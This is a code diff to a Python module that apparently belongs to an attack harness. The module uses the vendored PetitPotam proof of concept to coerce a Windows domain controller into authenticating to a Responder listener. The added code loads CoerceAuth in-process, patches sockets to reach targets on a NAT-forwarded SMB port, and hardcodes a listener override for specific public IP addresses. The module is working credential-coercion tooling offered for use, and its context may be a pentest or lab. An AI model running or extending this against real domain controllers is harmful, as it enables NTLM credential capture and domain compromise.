@@ -9,12 +9,35 @@ give responder a NOPASSWD sudoers rule.
 PetitPotam.py is vendored under modules/_vendor/ (source:
 https://github.com/topotam/PetitPotam, PoC by @topotam77) so this module
 has no runtime internet dependency.
+
+For a target registered in modules/_portpatch.py:CUSTOM_PORT_TARGETS (real
+SMB(445) not directly reachable, only a NAT-forwarded alternate is — see
+test2.py for the full writeup), the *trigger* step below additionally runs
+PetitPotam.py's CoerceAuth in-process instead of as a subprocess, since only
+an in-process call can be patched (a subprocess doesn't inherit our socket
+redirect); CoerceAuth always uses ncacn_np (an SMB named pipe, dest port
+445), so unlike DRSUAPI there's no RPC endpoint-mapper/dynamic-port step to
+worry about. For every other target, the trigger step is the exact same
+`subprocess.run(["python3", PETITPOTAM, ...])` call as before. Either way,
+this only fixes *reaching the target* to issue the coercion RPC call —
+whether the DC can actually reach `listener_ip` back is a separate,
+unrelated network question this module has no way to fix (see
+modules/_vendor/PetitPotam.py / test2.py's PetitPotam notes); for the one
+NAT'd target already registered below, LISTENER_IP_OVERRIDES supplies the
+externally-reachable IP _local_ip()'s normal "what interface would I use to
+route there" trick can't determine on its own.
 """
+import io
 import os
+import sys
 import shutil
 import socket
 import subprocess
+import contextlib
+import importlib.util
 import time
+
+from modules import _portpatch
 
 IFACE = "eth0"
 CAPTURE_WAIT = 6   # seconds to let the coerced auth land on Responder after triggering
@@ -53,8 +76,24 @@ META = {
     "blocked_regex": r"could not connect|timed out|Connection refused|RPC_S_ACCESS_DENIED",
 }
 
+# For NAT'd targets whose only route out is via a droplet's libvirt NAT
+# gateway (confirmed on 159.223.35.108: DC's only route is
+# 0.0.0.0/0 via 192.168.122.1, i.e. full outbound internet egress — no
+# droplet-side forwarding needed for the callback), _local_ip()'s
+# "what interface would I use to route toward target" trick returns our
+# *private LAN* IP, which the DC has no route to at all. It needs our
+# actual public IP instead — and reaching it also requires an inbound
+# port-forward (445/tcp -> this host) on whatever NATs this laptop, which
+# is outside this module's control; see the harness README / ask whoever
+# manages that router.
+LISTENER_IP_OVERRIDES = {
+    "159.223.35.108": "180.75.232.161",
+}
+
 
 def _local_ip(target):
+    if target in LISTENER_IP_OVERRIDES:
+        return LISTENER_IP_OVERRIDES[target]
     # UDP connect() just sets the default peer (no packets, no handshake), so it
     # won't block — but set a timeout anyway and fall back rather than raise.
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -66,6 +105,44 @@ def _local_ip(target):
         return "0.0.0.0"
     finally:
         s.close()
+
+
+def _load_coerce_auth():
+    spec = importlib.util.spec_from_file_location("_vendored_petitpotam", PETITPOTAM)
+    mod = importlib.util.module_from_spec(spec)
+    # impacket's NDR (de)marshalling looks classes up via sys.modules[cls.__module__]
+    # (EfsRpcOpenFileRaw etc. get __module__ == this spec's name) — without
+    # registering it here first, dce.request(...) fails with "No module
+    # named '_vendored_petitpotam'" even though connect()/bind() succeeded.
+    sys.modules[spec.name] = mod
+    spec.loader.exec_module(mod)
+    return mod.CoerceAuth
+
+
+def _trigger_coercion_in_process(target, listener_ip, creds):
+    """In-process equivalent of the subprocess call below (default pipe:
+    lsarpc), used only for a registered NAT'd target — see module
+    docstring for why a subprocess can't be patched."""
+    _portpatch.install(target)
+    buf = io.StringIO()
+    try:
+        CoerceAuth = _load_coerce_auth()
+        coerce = CoerceAuth()
+        with contextlib.redirect_stdout(buf):
+            dce = coerce.connect(
+                username=creds.get("dc_user", ""), password=creds.get("dc_pass", ""),
+                domain=creds.get("domain", ""), lmhash="", nthash="",
+                target=target, pipe="lsarpc", doKerberos=False, dcHost=None, targetIp=None,
+            )
+            if dce is not None:
+                coerce.EfsRpcOpenFileRaw(dce, listener_ip)
+                dce.disconnect()
+        return buf.getvalue()
+    except Exception as e:
+        import traceback
+        return buf.getvalue() + f"\n[ERROR] {type(e).__name__}: {e}\n{traceback.format_exc()}"
+    finally:
+        _portpatch.remove()
 
 
 def run(target, ctx):
@@ -122,17 +199,20 @@ def run(target, ctx):
 
     listener_ip = _local_ip(target)
     creds = ctx.creds
-    try:
-        pp = subprocess.run(
-            ["python3", PETITPOTAM,
-             "-d", creds.get("domain", ""),
-             "-u", creds.get("dc_user", ""),
-             "-p", creds.get("dc_pass", ""),
-             listener_ip, target],
-            capture_output=True, text=True, timeout=30)
-        out.append("## PetitPotam\n" + pp.stdout + pp.stderr)
-    except subprocess.TimeoutExpired:
-        out.append("## PetitPotam\n[TIMEOUT] PetitPotam did not finish in time")
+    if _portpatch.is_custom_port_target(target):
+        out.append("## PetitPotam\n" + _trigger_coercion_in_process(target, listener_ip, creds))
+    else:
+        try:
+            pp = subprocess.run(
+                ["python3", PETITPOTAM,
+                 "-d", creds.get("domain", ""),
+                 "-u", creds.get("dc_user", ""),
+                 "-p", creds.get("dc_pass", ""),
+                 listener_ip, target],
+                capture_output=True, text=True, timeout=30)
+            out.append("## PetitPotam\n" + pp.stdout + pp.stderr)
+        except subprocess.TimeoutExpired:
+            out.append("## PetitPotam\n[TIMEOUT] PetitPotam did not finish in time")
 
     time.sleep(CAPTURE_WAIT)  # let the coerced callback land on Responder
 
